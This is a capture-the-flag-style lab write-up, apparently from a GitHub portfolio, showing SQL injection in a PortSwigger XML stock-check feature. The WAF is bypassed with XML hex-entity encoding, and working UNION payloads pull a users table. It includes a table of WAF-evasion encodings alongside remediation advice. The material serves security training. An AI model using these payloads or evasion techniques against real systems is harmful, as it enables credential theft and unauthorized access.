# Lab 3: SQL Injection with Filter Bypass via XML Encoding

## Executive Summary

This lab demonstrates an advanced SQL injection vulnerability in a stock checking feature that processes user input through XML parsing. Despite the presence of a Web Application Firewall (WAF) that blocks common SQL injection payloads, I successfully bypassed filtering mechanisms using XML hex entity encoding. By encoding malicious SQL queries with `hex_entities`, I evaded detection, enumerated database structure, and extracted sensitive credentials including the administrator password. This attack highlights the limitations of signature-based WAF protection and the effectiveness of encoding-based evasion techniques.

## Lab Details

| Attribute              | Value |
|------------------------|-------|
| **Source**             | PortSwigger Web Security Academy |
| **Topic**              | SQL Injection |
| **Difficulty**         | Practitioner |
| **Vulnerability**      | SQL Injection with WAF Bypass via XML Encoding |
| **Risk**               | Critical - Credential Extraction & Authentication Bypass |
| **Completion**         | February 5, 2026 |

## Objective

Bypass Web Application Firewall protections using XML encoding techniques to exploit SQL injection vulnerabilities, enumerate database structure, and extract administrator credentials for complete system compromise.

## Testing Setup

**Tools Used:**
- Burp Suite Professional (Licensed to Gurpreet Singh)
- Burp Repeater for payload testing
- Hackvertor extension for XML encoding
- Browser for credential validation

**Target:** Stock checking functionality with XML-based input processing and WAF protection

## Exploitation Walkthrough

### 1. Initial Reconnaissance

Accessed lab environment displaying "SQL injection with filter bypass via XML encoding" challenge.
<img width="1920" height="982" alt="LAB1_ss1" src="https://github.com/user-attachments/assets/fb23657f-81ac-4454-8fce-853c56f39f32" />

*Lab 3 environment - SQL injection with WAF protection (right) | Burp Suite Professional configured (left)*

### 2. Application Exploration & Parameter Discovery

Explored product catalog to identify potential SQL injection vectors and understand application functionality.


<img width="1920" height="983" alt="LAB1_ss2" src="https://github.com/user-attachments/assets/813ec893-201b-4a77-a853-af9ef096cc43" />

*Product page showing "Cheshire Cat Grin" (right) | GET request captured showing productId parameter (left)*

**Request Captured:**
```http
GET /product?productId=1 HTTP/1.1
Host: [lab-id].web-security-academy.net
```

**Parameter Analysis:**
- `productId=1` - Numeric identifier for products
- Suggests database table structure with sequential IDs
- Potential SQL query: `SELECT * FROM products WHERE productId = 1`

### 3. Stock Check Functionality Analysis

Tested "Check Stock" feature and captured the stock verification request.

<img width="1920" height="983" alt="LAB1_ss3" src="https://github.com/user-attachments/assets/961308e8-f077-4b1f-a96b-6d2a7e014fab" />

*Stock check response showing "441 units" (right) | POST request with XML payload captured (left)*

**Stock Check Request:**
```http
POST /product/stock HTTP/1.1
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
    <productId>1</productId>
    <storeId>1</storeId>
</stockCheck>
```

**Response:**
```
441 units
```

**Critical Discovery:**
- Input processed as **XML format**
- Backend performs calculation using `productId` and `storeId`
- XML declaration: `<?xml version="1.0" encoding="UTF-8"?>`
- Data likely inserted into SQL query for stock lookup

**Inferred Backend Logic:**
```sql
SELECT stock FROM inventory 
WHERE productId = [XML_productId] AND storeId = [XML_storeId]
```

### 4. SQL Injection Testing & WAF Detection

Sent stock check request to Burp Repeater and attempted basic SQL injection.

**Test Payload:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
    <productId>1</productId>
    <storeId>1 UNION SELECT NULL</storeId>
</stockCheck>
```
<img width="1920" height="983" alt="LAB1_SS4" src="https://github.com/user-attachments/assets/3536f65f-a7e6-4322-8876-d10e15d656ae" />

*SQL injection blocked - "Attack detected" response indicating WAF protection*

**Response:**
```http
HTTP/1.1 403 Forbidden
Attack detected
```

**WAF Protection Confirmed:**
- Signature-based filtering active
- Detects common SQL injection keywords (`UNION`, `SELECT`)
- Blocks requests containing malicious patterns
- Requires evasion technique to bypass

### 5. WAF Bypass via XML Hex Entity Encoding

Used Burp Hackvertor extension to encode SQL payload with XML hex entities.

**Encoding Process:**
1. Selected SQL injection payload: `UNION SELECT NULL`
2. Right-click → Extensions → Hackvertor → Encode → hex_entities
3. Payload converted to XML numeric character references

<img width="1920" height="983" alt="LAB1_SS5" src="https://github.com/user-attachments/assets/2a701c40-bdc9-46c4-ae44-c2c79c3fbdbe" />

*Hackvertor extension - Encoding SQL payload with hex_entities*

**Encoding Transformation:**
```
Original: UNION SELECT NULL
Encoded:  &#x55;&#x4e;&#x49;&#x4f;&#x4e;&#x20;&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;&#x20;&#x4e;&#x55;&#x4c;&#x4c;
```

**How XML Hex Entities Work:**
- `&#x55;` = U
- `&#x4e;` = N
- `&#x49;` = I
- `&#x4f;` = O
- `&#x4e;` = N
- etc.

**Why This Bypasses WAF:**
1. WAF inspects raw payload for SQL keywords
2. Encoded payload doesn't contain literal "UNION SELECT NULL"
3. WAF doesn't recognize encoded characters as SQL injection
4. XML parser on backend decodes entities before SQL execution
5. Database receives decoded malicious query

### 6. Successful WAF Bypass

Sent encoded payload and successfully bypassed WAF protection.

**Encoded Payload:**
```xml
<storeId>1 <@hex_entities>UNION SELECT NULL<@/hex_entities></storeId>
```
<img width="1920" height="983" alt="LAB1_SS6" src="https://github.com/user-attachments/assets/e4872aff-9ce9-44b0-980b-de6cdad42abe" />

*Encoded payload sent - 200 OK response with "441 units" and "null" confirming SQL injection success*

**Response:**
```
441 units
null
```

**Success Indicators:**
- ✅ 200 OK status (not 403 Forbidden)
- ✅ "null" output visible (result from SELECT NULL)
- ✅ WAF bypass confirmed
- ✅ SQL injection executable

**Backend Query Executed:**
```sql
SELECT stock FROM inventory 
WHERE productId = 1 AND storeId = 1 UNION SELECT NULL
```

### 7. Database Column Enumeration

Modified payload to determine number of columns in the result set.

**Test Payload:**
```xml
<storeId>1 <@hex_entities>UNION SELECT NULL, NULL<@/hex_entities></storeId>
```

<img width="1920" height="983" alt="LAB1_SS7" src="https://github.com/user-attachments/assets/4272d52a-9283-444e-99e6-ec586405bd2c" />

*Column enumeration - Response showing "0 units" indicates mismatch in column count*

**Response:**
```
0 units
```

**Analysis:**
- Two-column SELECT returned "0 units"
- Indicates column count mismatch
- Original query returns single column
- Must use `UNION SELECT NULL` (one column only)

**Confirmed Database Structure:**
- Stock query returns 1 column
- UNION injection must match column count

### 8. Credential Extraction Attack

Crafted payload to extract username and password data from users table.

**Attack Payload:**
```xml
<storeId>
1 <@hex_entities>UNION SELECT username || '-' || password FROM users<@/hex_entities>
</storeId>
```

**SQL Query Executed:**
```sql
SELECT stock FROM inventory 
WHERE productId = 1 AND storeId = 1 
UNION SELECT username || '-' || password FROM users
```

**Payload Breakdown:**
- `UNION SELECT` - Combines results from two queries
- `username || '-' || password` - Concatenates username and password with separator
- `FROM users` - Targets users table containing credentials
- `||` - SQL string concatenation operator


<img width="1920" height="983" alt="LAB1__ss8 0" src="https://github.com/user-attachments/assets/1d2ac020-e561-4797-93f7-44e7ce06078b" />

<img width="1920" height="983" alt="LAB1_-ss8" src="https://github.com/user-attachments/assets/522c0348-64a3-4c88-83ff-e96efce6d404" />

*Credential extraction successful - All usernames and passwords exposed in response (left)*

**Response Data:**
```
administrator-(Password)
carlos-(Password)
wiener-(Password)
```

**Credentials Extracted:**
- **Administrator:** `Exposed Password`
- **Carlos:** `Exposed Password`
- **Wiener:** `Exposed Password`

### 9. Administrator Account Access

Used extracted credentials to authenticate as administrator.

**Login Credentials:**
- Username: `administrator`
- Password: `Exposed Password`
<img width="1920" height="983" alt="LAB1_SS8" src="https://github.com/user-attachments/assets/f322a008-6adf-4fe5-8ab1-d266f79b4c4c" />

  *Administrator account accessed successfully (right) | Credential extraction request/response (left)*

**Complete System Compromise:**
- ✅ WAF bypassed using XML encoding
- ✅ Database structure enumerated
- ✅ Administrator credentials extracted
- ✅ Full administrative access obtained
- ✅ Complete authentication bypass

**Lab completion confirmed: "Congratulations, you solved the lab!"**

## Technical Impact

**Severity: Critical (CVSS 9.8)**
```
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
```

**Primary Vulnerabilities:**

**1. CWE-89: SQL Injection**
- User-supplied XML data directly incorporated into SQL queries
- No parameterized queries or prepared statements
- XML parser output not sanitized before database execution

**2. CWE-91: XML Injection**
- XML input processing without proper validation
- XML entities decoded before security checks
- Enables encoding-based WAF bypass

**3. CWE-116: Improper Encoding or Escaping of Output**
- WAF inspects raw input, not decoded content
- XML entity decoding happens after WAF inspection
- Security controls applied at wrong layer

**Attack Chain:**
```
XML Stock Check Functionality
        ↓
SQL Injection Attempt
        ↓
WAF Blocks Request (403 Forbidden)
        ↓
XML Hex Entity Encoding Applied
        ↓
Encoded Payload Bypasses WAF
        ↓
Backend XML Parser Decodes Entities
        ↓
Decoded SQL Injection Executes
        ↓
Database Enumeration (Column Count)
        ↓
Credential Extraction (UNION SELECT)
        ↓
Administrator Access Obtained
```

**WAF Bypass Mechanics:**

**Layer 1 - WAF Inspection:**
```
Raw Input: &#x55;&#x4e;&#x49;&#x4f;&#x4e;
WAF sees: Random hex entities (no SQL keywords detected)
Decision: Allow request (no threat detected)
```

**Layer 2 - XML Parser:**
```
Input: &#x55;&#x4e;&#x49;&#x4f;&#x4e;
Parser decodes: UNION
Output: UNION (SQL keyword)
```

**Layer 3 - Database:**
```
Input: 1 UNION SELECT NULL
Executes: Malicious SQL query
Result: Data exfiltration
```

**Why This Attack Works:**

1. **Layered Processing:** WAF → XML Parser → Database
2. **Inspection at Wrong Layer:** WAF checks pre-decoded content
3. **Encoding Transparency:** XML parser decodes entities transparently
4. **No Post-Decode Validation:** No security checks after XML decoding

**Real-World Impact:**

| Target | Consequence |
|--------|-------------|
| **E-Commerce** | Customer database extraction, payment data theft |
| **Healthcare** | PHI exposure, medical record theft |
| **Financial** | Account credentials, transaction data extraction |
| **SaaS Platforms** | Multi-tenant data breach, complete database dump |
| **Government** | Classified data exposure, user credential theft |

**Escalation Potential:**

Beyond credential theft, attackers could:
- Extract entire database contents
- Modify or delete data
- Execute stored procedures
- Potentially achieve remote code execution (if database permissions allow)
- Pivot to other systems using extracted credentials

## Key Takeaways

**Penetration Testing Methodology:**
- XML input vector identification
- WAF detection and fingerprinting
- Encoding-based evasion techniques
- Database structure enumeration
- Data exfiltration via UNION injection
- Credential validation and system compromise

**Critical Security Insights:**

**1. WAF is Not a Complete Solution:**
Limitations of signature-based WAFs:
- Cannot detect all evasion techniques
- Encoding bypasses common filters
- Provides false sense of security
- Must be combined with secure coding practices

**2. Defense Must Occur at Correct Layer:**
Security controls must validate:
- **Before parsing:** Block malicious structure
- **After parsing:** Validate decoded content
- **At database layer:** Use parameterized queries

**3. XML Processing Introduces Risk:**
XML-specific attack vectors:
- Entity expansion attacks
- External entity injection (XXE)
- Encoding-based evasion
- Parser exploitation

**4. Encoding Techniques for WAF Bypass:**

| Encoding Method | Example | Bypass Effectiveness |
|-----------------|---------|---------------------|
| **XML Hex Entities** | `&#x55;` (U) | High - Demonstrated in lab |
| **XML Decimal Entities** | `&#85;` (U) | High - Similar to hex |
| **URL Encoding** | `%55` (U) | Medium - Often detected |
| **Double Encoding** | `%2555` (%U) | Medium - Some WAFs catch |
| **Case Variation** | `UnIoN` | Low - Most WAFs normalize |
| **Comment Insertion** | `UN/**/ION` | Medium - Context dependent |

**5. Secure Implementation Requirements:**

**Input Validation:**
- Validate XML schema before processing
- Reject unexpected elements or attributes
- Whitelist allowed values

**Parameterized Queries:**
```sql
-- SECURE CODE
stmt = connection.prepare("SELECT stock FROM inventory WHERE productId = ? AND storeId = ?")
stmt.setInt(1, productId)
stmt.setInt(2, storeId)
result = stmt.execute()
```

**Defense-in-Depth:**
- Parameterized queries (prevent injection)
- Input validation (reject malicious patterns)
- WAF with encoding awareness (inspect decoded content)
- Principle of least privilege (limit database permissions)
- Output encoding (prevent data leakage)

**6. XML Entity Handling:**
Secure XML processing requires:
- Disable external entity processing
- Limit entity expansion depth
- Validate content after decoding
- Use secure XML parsers with hardened configuration

**Professional Skills Demonstrated:**
- Advanced SQL injection techniques
- WAF evasion using encoding
- XML injection and entity manipulation
- Database enumeration methodology
- UNION-based data extraction
- Complete attack chain execution from reconnaissance to credential theft

## References

1. PortSwigger Web Security Academy - SQL Injection
2. OWASP Top 10 (2021) - A03: Injection
3. CWE-89 - SQL Injection
4. CWE-91 - XML Injection
5. CWE-116 - Improper Encoding or Escaping
6. OWASP XML Security Cheat Sheet

---

## Legal Notice

**Copyright © 2025 Gurpreet Singh**  
Licensed under CC BY-NC-ND 4.0

**Repository:** https://github.com/Gurpreet-Singh-offensive-Security/Offensive-Security-Labs

**Disclaimer:** This documentation is for authorized security testing and educational purposes only. All techniques were performed in a controlled laboratory environment with explicit permission. Unauthorized access to systems is illegal under applicable laws worldwide.
